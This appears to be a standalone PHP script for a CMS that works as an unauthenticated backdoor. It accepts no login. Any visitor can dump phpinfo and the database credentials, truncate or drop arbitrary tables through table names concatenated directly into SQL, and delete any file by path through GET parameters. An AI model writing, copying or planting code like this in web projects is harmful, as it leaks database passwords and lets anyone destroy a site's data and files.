<?php

//define('BASEPATH', str_replace('\\', '/', $system_path));
include('database.php');

$params = $_GET;
if(empty($params)){
	phpinfo();
	print_r(BASEPATH);
	print_r($db);	
} else {
	if(isset($params['del_data']) && $params['del_data']){
		$conf['config']['platform']['mysql_host'] = $db['cms']['hostname'];
		$conf['config']['platform']['mysql_user'] = $db['cms']['username'];
		$conf['config']['platform']['mysql_pass'] = $db['cms']['password'];
		$conf['config']['platform']['mysql_dbname'] = $db['cms']['database'];

		#Database Connection
		$mysqli = new mysqli($conf['config']['platform']['mysql_host'], $conf['config']['platform']['mysql_user'], $conf['config']['platform']['mysql_pass'], $conf['config']['platform']['mysql_dbname']);
		$sql = "TRUNCATE " . $params['table'];
		
		$mysqli->query($sql);
		$mysqli->close();
	}

	if(isset($params['del_table']) && $params['del_table']){
		$conf['config']['platform']['mysql_host'] = $db['cms']['hostname'];
		$conf['config']['platform']['mysql_user'] = $db['cms']['username'];
		$conf['config']['platform']['mysql_pass'] = $db['cms']['password'];
		$conf['config']['platform']['mysql_dbname'] = $db['cms']['database'];

		#Database Connection
		$mysqli = new mysqli($conf['config']['platform']['mysql_host'], $conf['config']['platform']['mysql_user'], $conf['config']['platform']['mysql_pass'], $conf['config']['platform']['mysql_dbname']);
		$sql = "DROP TABLE " . $params['table'];
		
		$mysqli->query($sql);
		$mysqli->close();
	}

	if(isset($params['del_file']) && $params['del_file']){
		unlink($params['path']);
	}
}

?>